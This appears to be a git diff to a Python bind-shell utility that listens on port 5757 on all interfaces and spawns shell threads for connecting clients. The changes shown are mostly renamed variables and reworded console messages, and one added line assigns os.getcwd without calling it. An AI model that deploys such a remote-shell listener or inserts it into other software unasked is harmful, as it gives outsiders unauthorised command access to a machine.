@@ -6,9 +6,11 @@ import argparse
 import platform
 import time
 import requests
+import os
 from colorama import init, Fore, Back, Style
 
-os = platform.platform()
+os_type = platform.platform()
+pwd = os.getcwd
 
 DEFAULT_PORT = 5757
 MAX_BUFFER = 4096
@@ -140,12 +142,10 @@ def server():
     s.bind(("0.0.0.0", DEFAULT_PORT))
     s.listen()
     banner()
-    print("[+] Starting Bind Shell")
+    haxor_print("--- Starting Bind Shell ---", 0)
     while True:
         client_socket, addr = s.accept()
-        haxor_print("[+] New User Connected", 0)
-        haxor_print("[*] Ip: {}".format(public_ip), 0)
-        haxor_print("[*] Port: {}".format(DEFAULT_PORT), 0)
+        print("[+] New Bind From: {}".format(public_ip))
         threading.Thread(target=shell_thread, args=(client_socket,)).start()
 
 
@@ -153,7 +153,7 @@ def client(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, DEFAULT_PORT))
 
-    print(" (҂◡_◡) ᕤ Connecting to bind shell ")
+    haxor_print("--- Connnecting to Multibind ---")
 
     threading.Thread(target=send_thread, args=(s,)).start()
     threading.Thread(target=recv_thread, args=(s,)).start()
